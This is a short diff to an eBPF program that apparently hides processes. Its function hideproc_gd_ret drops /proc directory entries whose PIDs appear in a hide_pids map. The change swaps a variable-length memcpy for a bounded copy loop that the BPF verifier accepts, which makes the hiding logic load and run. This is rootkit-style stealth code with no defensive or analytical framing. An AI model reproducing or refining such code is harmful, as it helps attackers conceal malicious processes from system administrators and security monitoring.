@@ -667,7 +667,21 @@ int hideproc_gd_ret(struct pt_regs *ctx)
             bpf_map_lookup_elem(&hide_pids, &pid)) {
             removed = 1;
         } else {
-            __builtin_memcpy(buf + new_off, buf + off, reclen);
+            /* memcpy with variable size is not supported in BPF;
+             * copy byte-by-byte inside a bounded loop instead. */
+            if (reclen > 512) {
+                /* unexpectedly large dirent: give up filtering
+                 * and leave the buffer untouched (safe path). */
+                return 0;
+            }
+            for (int j = 0; j < 512; j++) {
+                if ((__u32)j >= reclen)
+                    break;
+                if (off + (__u64)j >= PROC_HIDE_BUFSZ ||
+                    new_off + (__u64)j >= PROC_HIDE_BUFSZ)
+                    break;
+                buf[new_off + j] = buf[off + j];
+            }
             new_off += reclen;
         }
         off += reclen;
